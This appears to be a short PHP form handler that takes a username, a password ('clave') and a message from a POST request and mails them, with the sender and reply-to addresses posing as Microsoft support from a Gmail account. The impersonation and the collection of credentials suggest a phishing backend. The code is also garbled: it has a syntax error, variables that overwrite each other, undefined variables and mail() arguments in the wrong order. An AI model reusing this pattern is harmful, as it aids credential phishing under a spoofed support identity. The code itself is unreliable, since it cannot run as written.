<?Php
if (isset($_POST['enviar'])) {
    if(!empty($_POST['usuario']) && !empty($_POST['clave']) && !empty($_POST['msg'])
       $name = $_POST ['usuario'])) {
       $name = $_POST ['clave'];
       $name = $_POST ['msg'];
       $header = "From: soportemicrosoft5@gmail.com" . "\r\n";
       $header = "Reply-to: soportemicrosoft5@gmail.com" . "\r\n"; 
       $header = "X-Mailer: PHP/". phpversion();
       mail($usuario,$clave,$msg,$header);
        if ($mail) {
            echo "<h4>¡Mail enviado exitosamente!</h4>";
          }
       }
 }